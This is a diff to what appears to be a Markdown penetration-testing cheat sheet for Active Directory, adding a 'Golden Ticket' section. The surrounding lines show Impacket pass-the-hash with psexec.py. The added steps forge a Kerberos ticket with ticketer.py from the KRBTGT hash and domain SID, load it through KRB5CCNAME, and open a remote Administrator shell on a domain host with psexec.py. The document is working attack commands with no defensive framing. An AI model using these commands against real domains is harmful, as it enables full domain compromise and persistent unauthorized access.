@@ -24,6 +24,26 @@ sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123
 ./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<IP TARGET>
 ```
 
+## Golden Ticket
+
+### Request a TGT
+
+```csharp
+./ticketer.py -nthash <KRBTGT NTLM HASH> -domain-sid <DOMAIN SID> -domain <MYDOMAIN.LOCAL> Administrator
+```
+
+### Import the TGT
+
+```csharp
+export KRB5CCNAME=krb5cc_91801115_mine
+```
+
+### Connect using the ticket
+
+```csharp
+./psexec.py CROOK.BADCORP.LOCAL/Administrator@10.110.0.222 -k -no-pass
+```
+
 ## DSYNC
 
 ```csharp
